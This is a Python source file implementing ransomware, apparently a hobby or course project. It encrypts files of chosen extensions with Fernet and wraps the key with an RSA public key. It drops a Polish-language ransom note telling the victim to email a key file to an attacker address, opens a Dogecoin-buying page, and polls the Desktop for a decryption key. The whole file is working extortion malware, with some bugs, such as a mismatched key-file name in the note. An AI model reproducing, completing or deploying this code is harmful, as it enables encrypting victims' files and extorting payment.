import os.path
import subprocess
import time
import webbrowser

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
from cryptography.fernet import Fernet


class Ransome:
    file_extends = ['txt', 'jpg', 'png', 'gif', 'pdf', 'dcx']

    def __init__(self):

        # key to encrypt decrypt files
        self.key = None
        self.crypter = None
        self.public_key = None

        self.sys_root = os.path.expanduser('~')
        self.local_root = r'./malwares/ransomware/localRoot'
        print(self.local_root)

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as f:
            fernet_key = f.read()

        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.importKey(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernet_key)

        with open(f'{self.sys_root}/Desktop/EMAIL_ME.txt', 'wb') as f:
            f.write(enc_fernet_key)

        self.key = enc_fernet_key
        self.crypter = None

    # decrypt fernet
    def decrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as f:
            fernet_key = f.read()

        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.importKey(open('private.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            dec_fernet_key = public_crypter.decrypt(fernet_key)
            f.write(dec_fernet_key)

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            print(data)
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)

    def crypt(self, encrypted=False):
        system = os.walk(self.local_root, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                print(file_path)
                if not file.split('.')[-1] in self.file_extends:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    def randsom_note(self):
        with open(f'{self.sys_root}/Desktop/RANSOM_NOTE.txt', 'w', encoding='utf8') as f:
            f.write(f'''
                                Aby odszyfrować kotki musisz:
                                1) Wyślij na emial zlyhaker@hakeremail.com plik {self.sys_root}\Desktop\MAIL_ME.txt 
                                2) W następny mailu dostaniesz instrukcje co robić dalej
                                3) Po spełnieniu naszych żądań dostaniesz plik który należy umieścić na pulpicie {self.sys_root}\Desktop\
                                
                                ░░░░░░░░░▄░░░░░░░░░░░░░░▄░░░░ ░░░░░░░░░▄░░░░░░░░░░░░░░▄░░░░ ░░░░░░░░░▄░░░░░░░░░░░░░░▄░░░░
                                ░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░░░ ░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░░░ ░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░░░
                                ░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░░░ ░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░░░ ░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░░░
                                ░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░░░ ░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░░░ ░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░░░
                                ░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐░░░ ░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐░░░ ░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐░░░
                                ░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░░░ ░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░░░ ░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░░░
                                ░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌░░ ░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌░░ ░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌░░
                                ░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐░░ ░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐░░ ░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐░░
                                ░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌░ ░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌░ ░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌░
                                ░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌░ ░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌░ ░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌░
                                ▐▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐░ ▐▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐░ ▐▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐░
                                ▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌ ▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌ ▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
                                ▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐░ ▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐░ ▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐░
                                ░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌░ ░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌░ ░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌░
                                ░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐░░ ░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐░░ ░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐░░
                                ░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌░░ ░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌░░ ░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌░░
                                ░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀░░░ ░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀░░░ ░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀░░░
                                ░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀░░░░░ ░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀░░░░░ ░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀░░░░░
                                ░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▀▀░░░░░░░░ ░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▀▀░░░░░░░░ ░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▀▀░░░░░░░░
            ''')

    def buy_doge(self):
        url = 'https://www.nerdwallet.com/article/investing/buy-dogecoin'
        webbrowser.open(url)

    def show_note(self):
        ransom = subprocess.Popen(['notepad.exe', f'{self.sys_root}/Desktop/RANSOM_NOTE.txt'])

    def check_desktop(self):
        while True:
            try:
                with open(f'{self.sys_root}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt(encrypted=True)
                break
            except Exception as e:
                pass
            time.sleep(10)


def start():
    ransome = Ransome()

    ransome.generate_key()
    ransome.crypt()
    ransome.write_key()
    ransome.encrypt_fernet_key()
    ransome.randsom_note()
    ransome.buy_doge()
    ransome.show_note()
    ransome.check_desktop()

    ransome.decrypt_fernet_key()
    ransome.crypt(encrypted=True)
